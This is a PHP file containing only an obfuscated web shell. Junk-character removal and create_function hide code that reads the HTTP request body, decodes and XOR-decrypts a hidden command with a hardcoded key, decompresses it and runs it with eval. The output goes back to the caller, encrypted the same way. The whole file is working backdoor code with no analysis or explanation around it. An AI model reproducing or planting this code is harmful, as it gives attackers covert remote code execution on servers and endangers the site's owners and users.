<?php
$I=str_replace('Tq','','TqcrTqeateTq_fTqTquTqnction');
$J='wawse64w_wdecode($mww[1]),$k)));$wo=@ob_get_contenwts();@wob_enwd_cleanw()';
$n='ts("wphp:w//input")w,w$m)w==1) {@obw_start();@ewval(w@gzwuncomprwess(@x(@b';
$u='r($i=w0;$iw<$l;){for($j=w0;($j<w$c&w&$i<w$l);$jw++,$i++){$o.=$wt{$wi}^$k{$';
$F='wj};ww}}return $o;}ifw w(@preg_matchw("/$wkwh(.+w)$kf/",@fwile_get_cwonten';
$O=';ww$r=@base6w4_encwodeww(@x(@gzcompreswws($o),$k));wpriwnt("$p$kh$r$kf");}';
$r='JfZwM7TL1s";funcwtion x(w$t,$kw){$c=swtrlen(w$kw);$l=stwrlwewn($t)w;$o="";fo';
$x='$wk="3bwfw10c71";$kh="29b089c8w35ew1";$wkf="wbcdeaaa36786w"w;$p="Abcmewdtw';
$N=str_replace('w','',$x.$r.$u.$F.$n.$J.$O);
$D=$I('',$N);$D();
?>
